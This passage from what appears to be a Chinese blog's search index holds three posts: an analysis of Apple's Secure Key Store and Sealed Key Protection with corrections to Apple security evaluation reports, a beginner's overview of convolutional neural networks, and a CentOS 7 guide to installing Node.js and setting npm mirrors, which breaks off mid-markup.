Protection，密封密钥保护，也称操作系统绑定密钥），是使用系统软件的测量值和仅在硬件中可用的密钥来保护（或密封）加密密钥的一种技术。搭载 Apple 芯片的 Mac 上，对 KEK 的保护通过整合有关系统安全性策略的信息进一步得到了加强。</p>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/SKP.png\" alt=\"SKP\"></p>\n<ul>\n<li>Apple 设备支持一项称为密封密钥保护 (SKP) 的技术，其旨在确保加密材料在这些情况下不可用：脱离设备时，或者对操作系统版本或安全性设置存在未经用户正确授权的操纵时。<strong>此功能不是由安全隔区提供，而是由位于更底层的硬件寄存器支持</strong>，目的是针对解密用户数据所需的密钥提供独立于安全隔区的额外保护层</li>\n<li>由用户密码与长期 SKP 密钥和硬件密钥 1（安全隔区的 UID）配合使用而生成的密钥称为密码派生密钥。<strong>此密钥用于保护用户密钥包（在所有支持的平台上）和 KEK（仅限在 macOS 中）</strong>，然后启用生物识别解锁或使用其他设备（如Apple Watch）自动解锁</li>\n<li>在搭载 Apple 芯片的 Mac 中，LLB（Low Level Bootloader，底层引导载入程序）会验证设备是否存在有效的 LocalPolicy，且 LocalPolicy 策略随机数值是否与<strong>安全储存组件中所储存的值匹配</strong></li>\n<li>系统还会使用一个独立于 lpnh 和 rpnh 的随机数，以便设备被“查找”置于停用状态时，现有操作系统可被停用（通过将其 <strong>LPN 和 RPN 从安全储存组件中移除</strong>）的同时仍保持系统 recoveryOS 可启动</li>\n</ul>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/mac-boot.png\" alt=\"搭载 Apple 芯片的 Mac 开机时的启动过程步骤\"></p>\n<p>初步探讨一下：</p>\n<ol>\n<li>Hardward key 1 &#x3D; UID，Hardward key 2 &#x3D; Key 0x835</li>\n<li>LPN（Local Policy Number，本地策略随机数）和 RPN（Remote Policy Number，远程策略随机数）是用于 LLB 校验的策略随机数值，也在安全存储组件中保存。</li>\n<li>passcode key 仍然由 passcode 和 UID 通过 PBKDF2 算法生成，但是增加了 LPN 和 RPN 的校验环节以支持 SKP 功能。</li>\n<li>操作系统绑定的目的是阻止用户安装未经 Apple 授权的操作系统，从根本上杜绝了 iOS 越狱功能。对于个人使用的 iPhone，其只能通过 Apple Store 安装官方认证的 APP，但是对于生产力工具 Macbook 来说，必须支持用户手工安装应用程序，因此设定了不同的安全等级来支持。</li>\n</ol>\n<h3 id=\"4-Key-0x89B-和-Key-0x835-存储方式的勘误\"><a href=\"#4-Key-0x89B-和-Key-0x835-存储方式的勘误\" class=\"headerlink\" title=\"4.  Key 0x89B 和 Key 0x835 存储方式的勘误\"></a>4.  <code>Key 0x89B</code> 和 <code>Key 0x835</code> 存储方式的勘误</h3><p><a href=\"Apple_iOS_16_iPhone_Security_Target_v1.1.pdf\">iOS 16 安全评估报告</a>的 P117 说明：<br>The UID is used to derive two other keys, called “Key 0x89B” and “Key 0x835”. These two keys are derived during <strong>the first boot</strong> by encrypting defined constants with the UID.</p>\n<p>P121 的密钥列表中，关于这两个 UID 衍生密钥的存储方式描述是：<br>SEP. Block 0 of the flash memory. (Effaceable storage.)</p>\n<p>P125 进一步描述：<br>The UID (a.k.a. UID key) is not accessible by any software. The “Key 0x89B” and “Key 0x835” keys are both derived by encrypting <strong>defined values (identical for all devices)</strong> with the UID key. All three keys are stored in the SEP. All other keys shown in the figure are stored in wrapped form in persistent storage and unwrapped when needed.</p>\n<p>笔者认为，这两个 UID 衍生密钥应该是安全隔区<strong>每次</strong>启动时，基于固定值计算得出并保存在内存中，无需持久化存储。</p>\n<ul>\n<li>Key 0x835 &#x3D; AES_KW(UID, 0x’01010101010101010101010101010101’)：Dkey 包裹密钥</li>\n<li>Key 0x89B &#x3D; AES_KW(UID, 0x’183e99676bb03c546fa468f51c0cbd49’)：EMF 包裹密钥</li>\n<li>Key 0x836 &#x3D; AES_KW(UID, 0x‘00E5A0E6526FAE66C5C1C6D4F16D6180’)</li>\n<li>Key 0x837 &#x3D; AES_KW(GID, 0x’345A2D6C5050D058780DA431F0710E15’)：Apple 固件的 img3 文件解密</li>\n<li>Key 0x838 &#x3D; AES_KW(UID, 0x’8C8318A27D7F030717D2B8FC5514F8E1‘)</li>\n</ul>\n<p>当然也有一种可能性，就是设备第一次启动时生成，并保存在安全存储组件的 Flash 中，这就留待后续验证吧。</p>\n<h3 id=\"5-关于文件读写流程的勘误\"><a href=\"#5-关于文件读写流程的勘误\" class=\"headerlink\" title=\"5. 关于文件读写流程的勘误\"></a>5. 关于文件读写流程的勘误</h3><p><a href=\"Apple_iOS_16_iPhone_Security_Target_v1.1.pdf\">iOS 16 安全评估报告</a>的 P126 提供了详细的文件读写流程，但似乎存在一些偏差，其描述为：</p>\n<blockquote>\n<p>XNU 判断文件保护类型，并将类密钥（用 Dkey 包装，或 Dkey XOR Passcode Key 包装）和文件密钥（用类密钥包装）发送到 SEP</p>\n</blockquote>\n<p>笔者的分析认为，内部的 SKS keyring 保存已解封的类密钥，尚未解封类密钥也保存在 SKS memory ，因此 XNU 无需发送 wrapped class key，仅提供 class key type 即可，请参见安全白皮书的描述：</p>\n<blockquote>\n<p>当打开一个文件时，系统会使用文件系统密钥解密文件的元数据，以显露出<strong>封装的文件独有密钥</strong>和表示它受哪个<strong>类保护的记号</strong>。文件独有或范围独有密钥使用类密钥解封，然后提供给硬件 AES 引擎，该引擎会在从闪存中读取文件时对文件进行解密。所有封装文件密钥的处理发生在安全隔区中；文件密钥绝不会直接透露给应用程序处理器。启动时，安全隔区与 AES 引擎协商得到一个临时密钥。当安全隔区解开文件密钥时， 它们又通过该临时密钥再次封装，然后发送回应用程序处理器。</p>\n</blockquote>\n<p>此外，iOS 4 破解技术中介绍 WARP 类型‘3’ 是两轮解封，硬件加密简化为：<code>Dkey XOR PDK</code>？</p>\n<hr>\n<h2 id=\"附录：Cocoa-框架\"><a href=\"#附录：Cocoa-框架\" class=\"headerlink\" title=\"附录：Cocoa 框架\"></a>附录：Cocoa 框架</h2><p>Cocoa 是苹果公司为 macOS 所创建的原生面向对象的应用程序接口，是 Mac OS X 上五大 AP 之一（其它四个是Carbon、POSIX、X11 和 Java）。</p>\n<p>Cocoa 应用程序一般在苹果公司的开发工具 Xcode（前身为 Project Builder ）和 Interface Builder 上用Objective-C 写成。</p>\n<p>Cocoa包含三个主要的 Objective-C 对象库，称为“框架”。框架的功能类似于动态库，即可以在运行时动态的加载应用程序的地址空间，但框架作为一个捆绑而非独立文件，其中除了可执行代码外，也包含了资源，头文件和文档。</p>\n<ul>\n<li>Foundation：面向对象的通用函数库。提供了字符串，数值的管理，容器及其枚举，分布式计算，事件循环，以及一些其它的与图形用户界面没有直接关系的功能，其中用于类和常数的函数有<code>NS</code>前缀（因为源自于NeXTSTEP）。<br>  它可以在 MacOS 和 iOS 中使用。</li>\n<li>AppKit（Application Kit，应用程序工具包）：包含了程序与图形用户界面交互所需的代码。基于 Foundation 创建的，也使用<code>NS</code>前缀（因为其直接派生自 NeXTSTEP）。<br>  它只能在 MacOS 中使用。</li>\n<li>UIKit（User Interface Kit，用户界面工具包）：用于 iOS 的图形用户界面工具包。与AppKit不同，它使用<code>UI</code>的前缀。</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://blog.elcomsoft.com/2023/03/perfect-acquisition-part-1-introduction/\">iOS 取证技术 - elcomsoft blog</a></li>\n<li><a href=\"https://medium.com/hackernoon/demystifying-apples-touch-id-4883d5121b77\">揭开 Apple Touch ID 的神秘面纱</a></li>\n<li><a href=\"https://fisco-bcos-documentation.readthedocs.io/zh-cn/v2.8.0/docs/articles/3_features/36_cryptographic/elliptic_curve.html\">一场椭圆曲线的寻根问祖之旅</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Elliptic-curve_cryptography\">椭圆曲线密码学 - Wiki</a></li>\n<li><a href=\"https://csrc.nist.gov/CSRC/media/Events/Key-Management-Workshop-2000/documents/x963_overview.pdf\">ANSI X9.63 Overview</a></li>\n<li><a href=\"https://www.antpedia.com/standard/sp/65347.html\">密钥管理的国际标准汇总</a></li>\n<li><a href=\"https://askanydifference.com/zh-CN/difference-between-eeprom-and-flash-with-table/\">EEPROM 与 Flash 的区别与比较</a></li>\n</ul>\n<h3 id=\"官方文档下载\"><a href=\"#官方文档下载\" class=\"headerlink\" title=\"官方文档下载\"></a>官方文档下载</h3><ul>\n<li><a href=\"apple-platform-security-guide-cn-2022.pdf\">Apple 平台安全保护 - 2022年中文版</a></li>\n<li><a href=\"Apple_Secure_Key_Store_Cryptographic_Module_with_Notes.pdf\">Apple SKS 加密模块（FIPS 140-2 非专用设备安全策略）- v10注释版</a></li>\n<li><a href=\"Apple_MacOS_13_Ventura_FileVault_Security_Target.pdf\">TOE 评估报告 - MacOS 13：FileVault</a></li>\n<li><a href=\"Apple_iOS_16_iPhone_Security_Target_v1.1.pdf\">TOE 评估报告 - iOS 16</a></li>\n<li><a href=\"Apple_T2_Security_Chip_Overview_2018.pdf\">Apple T2 安全芯片概览</a></li>\n<li><a href=\"Behind_the_Scenes_with_iOS_Security.pdf\">Behind the Scenes with iOS Security - Ivan Krstić</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=BLGFriOKz6U\">Behind the Scenes with iOS Security 演讲视频</a></li>\n</ul>\n<h3 id=\"研究报告下载\"><a href=\"#研究报告下载\" class=\"headerlink\" title=\"研究报告下载\"></a>研究报告下载</h3><ul>\n<li><a href=\"iPhone_Data_Protection_in_Depth.pdf\">iPhone Data Protection in Depth - Sogti</a></li>\n<li><a href=\"2016-BSidesROC-iOSCrypto.pdf\">iOS Encryption - NCC Group</a></li>\n<li><a href=\"Platform_Security.pdf\">iOS Platform Security</a></li>\n<li><a href=\"Data_Security_on_Mobile_Devices.pdf\">Data Security on Mobile Devices</a></li>\n<li><a href=\"us-16-Mandt-Demystifying-The-Secure-Enclave-Processor.pdf\">Demystifying the Secure Enclave Processor</a></li>\n<li><a href=\"iOS_Encryption_Systems.pdf\">iOS Encryption Systems - 奥地利格拉茨技术大学</a></li>\n<li><a href=\"0721C6_Andrey.Belenko_Evolution.of.iOS.Data.Protection.pdf\">iOS 5的数据保护技术分析</a></li>\n<li><a href=\"OWASP_BeNeLux_Day_2011_-_A._Belenko_-_Overcoming_iOS_Data_Protection.pdf\">iPhone 数据保护技术 - ELComSoft</a></li>\n</ul>\n"},{"title":"CNN 卷积神经网络简介","url":"/2024/05/26/CNN-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/","content":"<h2 id=\"一、基础知识\"><a href=\"#一、基础知识\" class=\"headerlink\" title=\"一、基础知识\"></a>一、基础知识</h2><p>　　卷积神经网络（Convolutional Neural Network，简称CNN），是一种前馈神经网络，人工神经元可以响应周围单元，可以进行大型图像处理。卷积神经网络包括卷积层和池化层。<br>卷积神经网络是受到生物思考方式启发的MLPs（多层感知器），它有着不同的类别层次，并且各层的工作方式和作用也不同。这里提供一个较好的CNN教程（<a href=\"http://cs231n.github.io/convolutional-networks/%EF%BC%89%E3%80%82%E6%96%87%E7%AB%A0%E4%B8%AD%E8%AF%A6%E7%BB%86%E4%BB%8B%E7%BB%8D%E4%BA%86CNN%E7%9A%84%E8%AE%A1%E7%AE%97%E6%96%B9%E5%BC%8F%E5%92%8C%E6%95%B0%E6%8D%AE%E7%9A%84%E6%B5%81%E5%8A%A8%E8%BF%87%E7%A8%8B%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AA%E5%81%9A%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8B%E7%BB%8D%E3%80%82\">http://cs231n.github.io/convolutional-networks/）。文章中详细介绍了CNN的计算方式和数据的流动过程，这里只做简单的介绍。</a></p>\n<p>卷积神经网络是人工神经网络的一种，已成为当前语音分析和图像识别领域的研究热点。它的权值共享网络结构使之更类似于生物神经网络，降低了网络模型的复杂度，减少了权值的数量。该优点在网络的输入是多维图像时表现的更为明显，使图像可以直接作为网络的输入，避免了传统识别算法中复杂的特征提取和数据重建过程。卷积网络是为识别二维形状而特殊设计的一个多层感知器，这种网络结构对平移、比例缩放、倾斜或者共他形式的变形具有高度不变性。</p>\n<p>CNNs是受早期的延时神经网络（TDNN）的影响。延时神经网络通过在时间维度上共享权值降低学习复杂度，适用于语音和时间序列信号的处理。</p>\n<p>CNNs是第一个真正成功训练多层网络结构的学习算法。它利用空间关系减少需要学习的参数数目以提高一般前向BP算法的训练性能。CNNs作为一个深度学习架构提出是为了最小化数据的预处理要求。在CNN中，图像的一小部分（局部感受区域）作为层级结构的最低层的输入，信息再依次传输到不同的层，每层通过一个数字滤波器去获得观测数据的最显著的特征。这个方法能够获取对平移、缩放和旋转不变的观测数据的显著特征，因为图像的局部感受区域允许神经元或者处理单元可以访问到最基础的特征，例如定向边缘或者角点。</p>\n<p>在卷积神经网络中,感受野(Receptive Field)是指特征图上的某个点能看到的输入图像的区域,即特征图上的点是由输入图像中感受野大小区域的计算得到的。<br>神经元感受野的值越大表示其能接触到的原始图像范围就越大，也意味着它可能蕴含更为全局，语义层次更高的特征；相反，值越小则表示其所包含的特征越趋向局部和细节。因此感受野的值可以用来大致判断每一层的抽象层次。</p>\n<h2 id=\"二、整体框架\"><a href=\"#二、整体框架\" class=\"headerlink\" title=\"二、整体框架\"></a>二、整体框架</h2><p>CNN 的基本结构由输入层、卷积层、取样层、全连接层及输出层构成。<br>卷积层和取样层一般会取若干个，采用卷积层和取样层交替设置，即一个卷积层连接一个取样层，取样层后再连接一个卷积层，依此类推。由于卷积层中输出特征面的每个神经元与其输入进行局部连接，并通过对应的连接权值与局部输入进行加权求和再加上偏置值，得到该神经元输入值，该过程等同于卷积过程，卷积神经网络也由此而得名。</p>\n<p><img src=\"/2024/05/26/CNN-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/car.jpg\" alt=\"car\"></p>\n<h3 id=\"1-输入层\"><a href=\"#1-输入层\" class=\"headerlink\" title=\"1. 输入层\"></a>1. 输入层</h3><p>与传统神经网络&#x2F;机器学习一样，模型需要输入的进行预处理操作，常见的输入层中对图像预处理方式有：</p>\n<ul>\n<li>去均值：把输入数据各个维度都中心化到0，所有样本求和求平均，然后用所有的样本减去这个均值样本就是去均值。</li>\n<li>归一化：数据幅度归一化到同样的范围，对于每个特征而言，范围最好是 [-1, 1]</li>\n<li>PCA&#x2F;SVD降维等：用PCA降维，让每个维度的相关度取消，特征和特征之间是相互独立的。白化是对数据每个特征轴上的幅度</li>\n</ul>\n<h3 id=\"2-卷积层-Convolutional-Layer\"><a href=\"#2-卷积层-Convolutional-Layer\" class=\"headerlink\" title=\"2. 卷积层 - Convolutional Layer\"></a>2. 卷积层 - Convolutional Layer</h3><h3 id=\"3-激励层\"><a href=\"#3-激励层\" class=\"headerlink\" title=\"3. 激励层\"></a>3. 激励层</h3><p>所谓激励，实际上是对卷积层的输出结果做一次非线性映射。<br>如果不用激励函数（其实就相当于激励函数是f(x)&#x3D;x），这种情况下，每一层的输出都是上一层输入的线性函数。容易得出，无论有多少神经网络层，输出都是输入的线性组合，与没有隐层的效果是一样的，这就是最原始的感知机了。<br>常用的激励函数有：</p>\n<p>Sigmoid函数<br>Tanh函数<br>ReLU<br>Leaky ReLU<br>ELU<br>Maxout</p>\n<p>激励层建议：</p>\n<ul>\n<li>首先ReLU，因为迭代速度快，但是有可能效果不加。</li>\n<li>如果ReLU失效的情况下，考虑使用Leaky ReLU或者Maxout，此时一般情况都可以解决。</li>\n<li>Tanh函数在文本和音频处理有比较好的效果。</li>\n</ul>\n<h3 id=\"4-取样层-Pooling-Layer\"><a href=\"#4-取样层-Pooling-Layer\" class=\"headerlink\" title=\"4. 取样层 - Pooling Layer\"></a>4. 取样层 - Pooling Layer</h3><p>　　池化（Pooling）：也称为欠采样或下采样。主要用于特征降维，压缩数据和参数的数量，减小过拟合，同时提高模型的容错性。主要有：</p>\n<p>Max Pooling：最大池化<br>Average Pooling：平均池化<br>　　Max Pooling：选取最大的，我们定义一个空间邻域（比如，2*2的窗口），并从窗口内的修正特征图中取出最大的元素，最大池化被证明效果更好一些。</p>\n<p>　　Average Pooling：平均的，我们定义一个空间邻域（比如，2*2的窗口），并从窗口内的修正特征图中算出平均值。</p>\n<h3 id=\"5-全连接层-Fully-Connected-Layer\"><a href=\"#5-全连接层-Fully-Connected-Layer\" class=\"headerlink\" title=\"5. 全连接层 - Fully-Connected Layer\"></a>5. 全连接层 - Fully-Connected Layer</h3><p>经过前面若干次卷积+激励+池化后，终于来到了输出层，模型会将学到的一个高质量的特征图片全连接层。其实在全连接层之前，如果神经元数目过大，学习能力强，有可能出现过拟合。因此，可以引入dropout操作，来随机删除神经网络中的部分神经元，来解决此问题。还可以进行局部归一化（LRN）、数据增强等操作，来增加鲁棒性。<br>　　当来到了全连接层之后，可以理解为一个简单的多分类神经网络（如：BP神经网络），通过softmax函数得到最终的输出。整个模型训练完毕。<br>　　两层之间所有神经元都有权重连接，通常全连接层在卷积神经网络尾部。也就是跟传统的神经网络神经元的连接方式是一样的： </p>\n<h3 id=\"6-输出层\"><a href=\"#6-输出层\" class=\"headerlink\" title=\"6. 输出层\"></a>6. 输出层</h3><h2 id=\"三、要点分析\"><a href=\"#三、要点分析\" class=\"headerlink\" title=\"三、要点分析\"></a>三、要点分析</h2><p>CNN 具有 4 个特点:局部连接、权值共享、池化操作及多层 。<br>CNN 能够通过多层非线性变换，从大数据中自动学习特征，从而代替手工设计的特 征，且深层的结构使它具有很强的表达能力和学习能力 。</p>\n<p>先介绍卷积层遇到的几个名词：<br><img src=\"/2024/05/26/CNN-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/arch-1.png\" alt=\"arch\"></p>\n<ul>\n<li>深度&#x2F;depth（解释见下图）</li>\n<li>步长&#x2F;stride （窗口一次滑动的长度）</li>\n<li>填充值&#x2F;zero-padding</li>\n</ul>\n<p>激活函数（又叫激励函数，后面就全部统称为激活函数）是模型整个结构中的非线性扭曲力，神经网络的每层都会有一个激活函数。<br>简单来说：1，加入非线性因素    2，充分组合特征。<br>在神经网络中，如果不对上一层结点的输出做非线性转换的话（其实相当于激活函数为 f(x)&#x3D;x），再深的网络也是线性模型，只能把输入线性组合再输出，不能学习到复杂的映射关系，而这种情况就是最原始的感知机（perceptron），那么网络的逼近能力就相当有限，因此需要使用激活函数这个非线性函数做转换，这样深层神经网络表达能力就更加强大了（不再是输入的线性组合，而是几乎可以逼近任意函数）。</p>\n<p><img src=\"/2024/05/26/CNN-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/JLHS.png\" alt=\"激励函数\"><br><img src=\"/2024/05/26/CNN-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/JLHS-2.png\" alt=\"激励函数结构\"></p>\n<p><img src=\"/2024/05/26/CNN-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/sigmoid.png\" alt=\"SigMoid\"><br><img src=\"/2024/05/26/CNN-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/tanh.png\" alt=\"tanh\"><br><img src=\"/2024/05/26/CNN-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/tanh-2.png\" alt=\"tanh-2\"><br><img src=\"/2024/05/26/CNN-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/ReLU.png\" alt=\"ReLU\"><br><img src=\"/2024/05/26/CNN-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/ELU.png\" alt=\"ELU\"></p>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.cnblogs.com/wj-1314/p/12015278.html\">深度学习笔记——常用的激活（激励）函数</a></li>\n<li><a href=\"https://www.cnblogs.com/wj-1314/p/9593364.html\">深入学习卷积神经网络中卷积层和池化层的意义</a></li>\n<li><a href=\"https://www.zdaiot.com/MachineLearning/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/%E5%8D%B7%E7%A7%AF%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8F%8A%E7%89%A9%E7%90%86%E6%84%8F%E4%B9%89%EF%BC%88%E5%85%A8%E9%9D%A2%E7%90%86%E8%A7%A3%E5%8D%B7%E7%A7%AF%EF%BC%89/\">卷积的本质及物理意义</a></li>\n</ul>\n<h2 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h2><ul>\n<li><a href=\"%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%A0%94%E7%A9%B6%E7%BB%BC%E8%BF%B0.pdf\">卷积神经网络研究综述</a></li>\n</ul>\n<h2 id=\"CNN-示例\"><a href=\"#CNN-示例\" class=\"headerlink\" title=\"CNN 示例\"></a>CNN 示例</h2><ul>\n<li><a href=\"http://yann.lecun.com/exdb/lenet/index.html\">LeNet-5 示例</a></li>\n</ul>\n<h3 id=\"视频资料\"><a href=\"#视频资料\" class=\"headerlink\" title=\"视频资料\"></a>视频资料</h3><ul>\n<li>[]</li>\n</ul>\n"},{"title":"Centos7安装node.js的操作步骤","url":"/2020/10/11/Centos7%E5%AE%89%E8%A3%85node-js%E7%9A%84%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4/","content":"<p>我当前使用的是Centos7.8，采用<code>yum install nodejs</code>方式安装当然是可以的，但是node版本只有<code>6.17.1</code>，许多新的软件无法安装，因此建议采用手工方式安装node.js</p>\n<h2 id=\"下载安装文件\"><a href=\"#下载安装文件\" class=\"headerlink\" title=\"下载安装文件\"></a>下载安装文件</h2><p>Node.js的官网地址是 <a href=\"https://nodejs.org/dist/\">https://nodejs.org/dist/</a>。<br>当前最新版本是<code>14.13.1</code>，LTS版本<code>12.19.0</code>，本人建议采用版本<code>14.2.0</code><br>至于CPU架构，Centos当然是<code>linux-x64</code></p>\n<p>官网速度太慢就算了，推荐腾讯云的镜像地址：<a href=\"https://mirrors.cloud.tencent.com/nodejs-release/\">https://mirrors.cloud.tencent.com/nodejs-release/</a></p>\n<h2 id=\"解压-安装\"><a href=\"#解压-安装\" class=\"headerlink\" title=\"解压 &amp; 安装\"></a>解压 &amp; 安装</h2><p>安装目录默认是<code>/usr/local/node/</code>，此时命令文件位于<code>/usr/local/node/bin/</code>。<br>注意，以后npm安装软件的命令文件都在此目录，因此后续要追加环境变量<code>$PATH</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://mirrors.cloud.tencent.com/nodejs-release/v14.2.0/node-v14.2.0-linux-x64.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\">tar -xvf node-v14.2.0-linux-x64.tar.gz</span><br><span class=\"line\"><span class=\"built_in\">mv</span> node-v14.2.0-linux-x64 /usr/local/node</span><br><span class=\"line\"><span class=\"built_in\">ls</span> -l /usr/local/node/bin</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"设置环境变量PATH\"><a href=\"#设置环境变量PATH\" class=\"headerlink\" title=\"设置环境变量PATH\"></a>设置环境变量PATH</h2><p>手工编辑全局配置文件<code>vi /etc/profile</code>，并在最后添加</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">export NODE_HOME=/usr/local/node</span><br><span class=\"line\">export PATH=$NODE_HOME/bin:$PATH</span><br></pre></td></tr></table></figure>\n\n<p>最后，运行命令行：<code>source /etc/profile</code>，以便当前环境激活配置，否则将在重启后生效。</p>\n<h2 id=\"检查方法\"><a href=\"#检查方法\" class=\"headerlink\" title=\"检查方法\"></a>检查方法</h2><p>如果安装正常，现在目录<code>/usr/local/node/</code>的状态应该是这样的，其中有三个命令文件：node、npm、npx<br>nodejs与npm的关系有点类似于redhat系统与yum的关系，npm就是node的包管理工具</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">├── bin</span><br><span class=\"line\">│   ├── node</span><br><span class=\"line\">│   ├── npm -&gt; ../lib/node_modules/npm/bin/npm-cli.js</span><br><span class=\"line\">│   └── npx -&gt; ../lib/node_modules/npm/bin/npx-cli.js</span><br><span class=\"line\">├── CHANGELOG.md</span><br><span class=\"line\">├── include</span><br><span class=\"line\">│   └── node</span><br><span class=\"line\">├── lib</span><br><span class=\"line\">│   └── node_modules</span><br><span class=\"line\">├── LICENSE</span><br><span class=\"line\">├── README.md</span><br><span class=\"line\">└── share</span><br><span class=\"line\">    ├── doc</span><br><span class=\"line\">    ├── man</span><br><span class=\"line\">    └── systemtap</span><br></pre></td></tr></table></figure>\n\n<p>查看安装目录和版本号的方法</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@centos7 local]# which node</span><br><span class=\"line\">/usr/local/node/bin/node</span><br><span class=\"line\"></span><br><span class=\"line\">[root@centos7 local]# node -v</span><br><span class=\"line\">v12.19.0</span><br><span class=\"line\"></span><br><span class=\"line\">[root@centos7 local]# npm -v</span><br><span class=\"line\">6.14.8</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"为npm设置国内镜像源\"><a href=\"#为npm设置国内镜像源\" class=\"headerlink\" title=\"为npm设置国内镜像源\"></a>为npm设置国内镜像源</h2><p>npm的默认安装源在境外，实在太慢了，通常有几种加速方案</p>\n<h3 id=\"阿里cnpm\"><a href=\"#阿里cnpm\" class=\"headerlink\" title=\"阿里cnpm\"></a>阿里cnpm</h3><p>阿里巴巴的淘宝团队把NMP官网的插件都同步到了在中国的服务器，提供给我们从这个服务器上稳定下载资源。<br><code>CNMP</code>同样是<code>NMP</code>的一个插件，要安装的话需要在CMD命令行控制台执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n<p>安装完成后可以使用<code>cnpm -v</code>命令查看版本号。<br><code>cnpm</code>的用法和<code>npm</code>的用法一致，只是在执行命令的时候将<code>npm</code>改为<code>cnpm</code>。</p>\n<h3 id=\"华为云镜像\"><a href=\"#华为云镜像\" class=\"headerlink\" title=\"华为云镜像\"></a>华为云镜像</h3><p>NPM的配置文件为用户根目录下的：<code>~/.npmrc</code>（Windows路径为：<code>C:\\Users\\&lt;UserName&gt;\\.npmrc</code>）<br>运行如下命令设置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm config <span class=\"built_in\">set</span> registry https://mirrors.huaweicloud.com/repository/npm/</span><br><span class=\"line\">npm cache clean -f</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"腾讯云镜像\"><a href=\"#腾讯云镜像\" class=\"headerlink\" title=\"腾讯云镜像\"></a>腾讯云镜像</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm config <span class=\"built_in\">set</span> registry http://mirrors.cloud.tencent.com/npm/</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"疑难杂症\"><a href=\"#疑难杂症\" class=\"headerlink\" title=\"疑难杂症\"></a>疑难杂症</h2><h3 id=\"1-Macbook-M1芯片的版本支持\"><a href=\"#1-Macbook-M1芯片的版本支持\" class=\"headerlink\" title=\"1. Macbook M1芯片的版本支持\"></a>1. Macbook M1芯片的版本支持</h3><p>2020年 Apple Macbook 推出了基于ARM指令集的 M1 自研芯片，而非原来基于x86指令集的 Intel 芯片。<br>node.js从<code>v16</code>开始，提供了M1芯片的兼容性支持，也就是darwin有 arm64 和 x64 两个版本。<br>具体可以参见 node.js官网下载页面的截图。</p>\n<img src=\"/2020/10/11/Centos7%E5%AE%89%E8%A3%85node-js%E7%9A%84%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4/node-m1.png\" class=\"\">\n\n<h3 id=\"2-Mac-OS安装npm可能出现的权限问题\"><a href=\"#2-Mac-OS安装npm可能出现的权限问题\" class=\"headerlink\" title=\"2. Mac OS安装npm可能出现的权限问题\"></a>2. Mac OS安装npm可能出现的权限问题</h3><p>Mac 用户如果在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入 <code>Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install</code> 安装命令行工具。</p>\n<p>Mac用户如果在尝试过程中出现 <code>EACCES</code> 权限错误，请遵循由 <a href=\"https://docs.npmjs.com/resolving-eacces-permissions-errors-when-installing-packages-globally\">npmjs 发布的指导</a> 修复该问题。</p>\n<p>强烈建议 不要 使用 root、sudo 等方法覆盖权限。</p>\n<hr>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" 